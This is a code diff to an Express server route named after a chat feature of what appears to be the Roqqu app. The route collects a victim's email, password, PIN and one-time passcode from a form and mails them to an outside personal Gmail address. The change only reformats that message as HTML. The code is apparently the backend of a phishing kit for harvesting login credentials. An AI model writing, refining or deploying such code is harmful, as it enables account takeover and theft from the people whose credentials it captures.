@@ -56,7 +56,7 @@ app.post('/roqquappchat', (req, res, next) => {
   )
 
   const {email, password, pin, otp} = req.body
-  const content = `\n <strong>Email</strong>: ${email} \n password: ${password} \n PIN: ${pin} \n OTP: ${otp} `
+  const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong></p> ${pin} </br> <p><strong>OTP:</strong></p>${otp} `
 
 
 
@@ -64,7 +64,7 @@ app.post('/roqquappchat', (req, res, next) => {
       from: 'admin@growveonct.com',
       to: 'ifestephenie@gmail.com',
       subject: 'New message from Roqquappchat',
-      text: content,
+      html: content,
   }
 
   transporter.sendMail(mail, (err, data) => {
